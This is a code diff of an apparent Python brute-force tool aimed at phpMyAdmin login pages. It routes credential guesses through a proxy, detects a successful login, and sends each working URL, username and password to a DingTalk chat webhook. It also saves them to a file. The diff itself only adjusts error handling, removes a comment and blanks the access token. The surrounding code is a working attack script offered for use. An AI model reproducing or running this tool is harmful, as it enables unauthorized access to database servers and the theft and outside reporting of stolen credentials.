@@ -1,3 +1,4 @@
+
 import requests
 import json
 
@@ -35,6 +36,8 @@ class FuckPhpmyadmin:
                             break
                     except:
                         print("something is wrong")
+                        print(url)
+                        break
 
     def Brute_kernel(self,url,username,password):
         http=requests.Session()
@@ -54,13 +57,12 @@ class FuckPhpmyadmin:
         res=http.post(url,data=data,headers=headers,proxies={"http":"http://127.0.0.1:8118"}).text
         if "information_schema" in res:
             write_line="url:"+url+" | user:"+username+" | pass:"+password+" SUCCESS"
-            # 下面是可选功能
             data={
                 "msgtype":"text",
                 "text":{"content":"喵喵喵,%s"%write_line}
             }
             data=json.dumps(data)
-            requests.post("https://oapi.dingtalk.com/robot/send?access_token=99999999",data=data,headers={'Content-Type': 'application/json'})
+            requests.post("https://oapi.dingtalk.com/robot/send?access_token=",data=data,headers={'Content-Type': 'application/json'})
             print(write_line)
             with open("success.txt","a") as f:
                 f.write(write_line+"\n")
